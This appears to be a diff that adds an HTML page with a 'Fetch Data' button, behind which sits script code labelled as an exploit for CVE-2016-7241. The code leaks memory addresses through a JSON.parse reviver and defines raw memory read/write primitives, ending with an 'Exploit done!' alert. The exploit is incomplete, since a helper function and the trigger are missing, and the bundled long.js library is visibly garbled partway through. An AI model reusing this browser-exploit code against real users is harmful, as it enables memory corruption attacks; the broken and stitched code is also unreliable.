@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+    <head>
+      <style>body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f0f0f0;
+}
+
+.container {
+    max-width: 600px;
+    margin: 50px auto;
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+.button {
+    display: inline-block;
+    padding: 10px 20px;
+    background-color: #007bff;
+    color: #fff;
+    font-size: 16px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.button:hover {
+    background-color: #0056b3;
+}
+
+.data-display {
+    margin-top: 20px;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    background-color: #f9f9f9;
+    font-size: 14px;
+    line-height: 1.5;
+    overflow: auto;
+    max-height: 200px;
+}
+</style>
+    </head>
+<body>
+        <div class="container">
+            <button class="button" id="fetchDataBtn">Fetch Data</button>
+            <div id="dataDisplay" class="data-display"></div>
+        </div>
+
+
+<script>
+var Long = dcodeIO.Long;
+var dv;
+var fdv = new DataView(new ArrayBuffer(8));
+
+// Create a new TypedArray instead of using Array.prototype.slice()
+var x = new Uint8Array(16); // 16 bytes
+
+// Fill x with your initial values
+x.set([56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
+
+var hi, lo;
+[hi, lo] = getAddress(x);
+
+[hi, lo] = [hi|0, (lo + 0x58)|0];   // offset (0x58) to the array data slots
+
+// TriggerFillFromPrototypesBug function
+
+alert("Exploit done!");
+
+/*(CVE-2016-7241)*/
+function getAddress(y)
+{
+    var b = false;
+    var a = 1;
+
+    function f(name, value){
+         if(!b){ // only do once
+            a = new Array(2); // for leaking low, and high address
+            this[1] = a; // this == json values
+        }
+        b = true;
+        return y; // object we are leaking address of
+    }
+    JSON.parse("[1, 2]", f);
+    return [a[1], a[0]];    
+}
+
+/* Utility functions */
+function Read32(addr)
+{
+    SetAddress(addr);
+    return new Long(fdv.getUint32(0, true), 0, true);
+}
+
+function Read64(addr)
+{
+    SetAddress(addr);
+    return new Long(fdv.getUint32(0, true), fdv.getUint32(4, true), true);
+}
+
+function Write32(addr, val)
+{
+    SetAddress(addr);
+    fdv.setUint32(0, val.low|0, true);
+}
+
+function Write64(addr, val)
+{
+    SetAddress(addr);
+    fdv.setUint32(0, val.low|0, true);
+    fdv.setUint32(4, val.high|0, true);
+}
+</script>
+<script>/*
+ long.js (c) 2013 Daniel Wirtz <dcode@dcode.io>
+ Released under the Apache License, Version 2.0
+ see: https://github.com/dcodeIO/long.js for details
+*/
+(function(d,g){"function"===typeof define&&define.amd?define([],g):"function"===typeof require&&"object"===typeof module&&module&&module.exports?module.exports=g():(d.dcodeIO=d.dcodeIO||{}).Long=g()})(this,function(){function d(a,b,c){this.low=a|0;this.high=b|0;this.unsigned=!!c}function g(a){return!0===(a&&a.__isLong__)}function m(a,b){var c,t;if(b){a>>>=0;if(t=0<=a&&256>a)if(c=z[a])return c;c=e(a,0>(a|0)?-1:0,!0);t&&(z[a]=c)}else{a|=0;if(t=-128<=a&&128>a)if(c=A[a])return c;c=e(a,0>a?-1:0,!1);t&&
+(A[a]=c)}return c}function n(a,b){if(isNaN(a)||!isFinite(a))return b?p:k;if(b){if(0>a)return p;if(a>=B)return C}else{if(a<=-D)return l;if(a+1>=D)return E}return 0>a?n(-a,b).neg():e(a%4294967296|0,a/4294967296|0,b)}function e(a,b,c){return new d(a,b,c)}function x(a,b,c){if(0===a.length)throw Error("empty string");if("NaN"===a||"Infinity"===a||"+Infinity"===a||"-Infinity"===a)return k;"number"===typeof b?(c=b,b=!1):b=!!b;c=c||10;if(2>c||36<c)throw RangeError("radix");var t;if(0<(t=a.indexOf("-")))throw Error("interior hyphen");
+if(0===t)return x(a.substring(1),b,c).neg();t=n(v(c,8));for(var e=k,f=0;f<a.length;f+=8){var d=Math.min(8,a.length-f),l=parseInt(a.substring(f,f+d),c);8>d?(d=n(v(c,d)),e=e.mul(d).add(n(l))):(e=e.mul(t),e=e.add(n(l)))}e.unsigned=b;return e}function q(a){return a instanceof d?a:"number"===typeof a?n(a):"string"===typeof a?x(a):e(a.low,a.high,a.unsigned)}Object.defineProperty(d.prototype,"__isLong__",{value:!0,enumerable:!1,configurable:!1});d.isLong=g;var A={},z={};d.fromInt=m;d.fromNumber=n;d.fromBits=
+e;var v=Math.pow;d.fromString=x;d.fromValue=q;var B=4294967296*4294967296,D=B/2,F=m(16777216),k=m(0);d.ZERO=k;var p=m(0,!0);d.UZERO=p;var r=m(1);d.ONE=r;var G=m(1,!0);d.UONE=G;var y=m(-1);d.NEG_ONE=y;var E=e(-1,2147483647,!1);d.MAX_VALUE=E;var C=e(-1,-1,!0);d.MAX_UNSIGNED_VALUE=C;var l=e(0,-2147483648,!1);d.MIN_VALUE=l;var b=d.prototype;b.toInt=function(){return this.unsigned?this.low>>>0:this.low};b.toNumber=function(){return this.unsigned?4294967296*(this.high>>>0)+(this.low>>>0):4294967296*this.high+
+(this.low>>>0)};b.toString=function(a){a=a||10;if(2>a||36<a)throw RangeError("radix");if(this.isZero())return"0";if(this.isNegative()){if (this.eq(l)) {
+    if (a.eq(r) || a.eq(y)) return l;
+    if (a.eq(l)) return r;
+    b = this.shr(1).div(a).shl(1);
+    if (b.eq(k)) return a.isNegative() ? r : y;
+    c = this.sub(a.mul(b));
+    return d = b.add(c.div(a));
+}
+if (this.isNegative()) {
+    return a.isNegative() ? this.neg().div(a.neg()) : this.neg().div(a).neg();
+}
+if (a.isNegative()) {
+    return this.div(a.neg()).neg();
+}
+d = k;
+}
+for (c = this; c.gte(a);) {
+    b = Math.max(1, Math.floor(c.toNumber() / a.toNumber()));
+    for (var e = Math.ceil(Math.log(b) / Math.LN2), e = 48 >= e ? 1 : v(2, e - 48), f = n(b), m = f.mul(a); m.isNegative() || m.gt(c);) {
+        b -= e;
+        f = n(b, this.unsigned);
+        m = f.mul(a);
+    }
+    f.isZero() && (f = r);
+    d = d.add(f);
+    c = c.sub(m);
+}
+return d;
+};
+b.div = b.divide;
+b.modulo = function (a) {
+g(a) || (a = q(a));
+return this.sub(this.div(a).mul(a));
+};
+b.mod = b.modulo;
+b.not = function () {
+return e(~this.low, ~this.high, this.unsigned);
+};
+b.and = function (a) {
+g(a) || (a = q(a));
+return e(this.low & a.low, this.high & a.high, this.unsigned);
+};
+b.or = function (a) {
+g(a) || (a = q(a));
+return e(this.low | a.low, this.high | a.high, this.unsigned);
+};
+b.xor = function (a) {
+g(a) || (a = q(a));
+return e(this.low ^ a.low, this.high ^ a.high, this.unsigned);
+};
+b.shiftLeft = function (a) {
+g(a) && (a = a.toInt());
+return 0 === (a &= 63) ? this : 32 > a ? e(this.low << a, this.high << a | this.low >>> 32 - a, this.unsigned) : e(0, this.low << a - 32, this.unsigned);
+};
+b.shl = b.shiftLeft;
+b.shiftRight = function (a) {
+g(a) && (a = a.toInt());
+return 0 === (a &= 63) ? this : 32 > a ? e(this.low >>> a | this.high << 32 - a, this.high >> a, this.unsigned) : e(this.high >> a - 32, 0 <= this.high ? 0 : -1, this.unsigned);
+};
+b.shr = b.shiftRight;
+b.shiftRightUnsigned = function (a) {
+g(a) && (a = a.toInt());
+a &= 63;
+if (0 === a) return this;
+var b = this.high;
+return 32 > a ? e(this.low >>> a | b << 32 - a, b >>> a, this.unsigned) : 32 === a ? e(b, 0, this.unsigned) : e(b >>> a - 32, 0, this.unsigned);
+};
+b.shru = b.shiftRightUnsigned;
+b.toSigned = function () {
+return this.unsigned ? e(this.low, this.high, !1) : this;
+};
+b.toUnsigned = function () {
+return this.unsigned ? this : e(this.low, this.high, !0);
+};
+b.toBytes = function (a) {
+return a ? this.toBytesLE() : this.toBytesBE();
+};
+b.toBytesLE = function () {
+var a = this.high,
+b = this.low;
+return [b & 255, b >>> 8 & 255, b >>> 16 & 255, b >>> 24 & 255, a & 255, a >>> 8 & 255, a >>> 16 & 255, a >>> 24 & 255];
+};
+b.toBytesBE = function () {
+var a = this.high,
+b = this.low;
+return [a >>> 24 & 255, a >>> 16 & 255, a >>> 8 & 255, a & 255, b >>> 24 & 255, b >>> 16 & 255, b >>> 8 & 255, b & 255];
+};
+return d;
+});
+</script>
+</body>
+</html>
